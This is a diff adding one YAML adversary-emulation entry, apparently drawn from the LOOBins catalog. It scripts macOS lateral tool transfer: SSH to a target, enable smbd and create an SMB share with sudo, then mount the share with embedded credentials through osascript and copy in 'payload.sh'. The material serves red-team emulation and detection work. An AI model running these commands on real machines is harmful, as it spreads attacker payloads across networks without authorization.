@@ -1,0 +1,41 @@
+- id: 39556743-2b6b-607b-2e0d-66db829cb1ce
+  name: sharing - Create an SMB share on a target over SSH for lateral tool transfer
+  description: With SSH access to the target, the sharing utility can create an SMB share pointing to
+    a directory on the target. Combined with the macOS smbd LaunchDaemon, the share becomes accessible
+    over the network. The attacker can then mount the share using osascript and copy files directly into
+    it, which appear immediately in the target's share directory. The -s 001 flag enables SMB access on
+    the share.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: 'Remote Services: SSH'
+  platforms:
+    darwin:
+      sh:
+        command: '# On target (via SSH): create share directory, start smbd, create the share
+
+          ssh user@<TARGET_IP> ''mkdir -p ~/share && sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smbd.plist
+          && sudo sharing -a /Users/user/share -n share -s 001''
+
+
+          # On attacker: mount the share using osascript and transfer a file
+
+          osascript -e ''mount volume "smb://user:<PASSWORD>@<TARGET_IP>/share"''
+
+          cp payload.sh /Volumes/share/'
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  delete_payload: false
+  buckets:
+  - loobins
+  - sharing
+  - lateral-movement
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: sharing
+    use_case: Create an SMB share on a target over SSH for lateral tool transfer
+    source_file: sharing.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-05-01T05:41:42.745896Z'
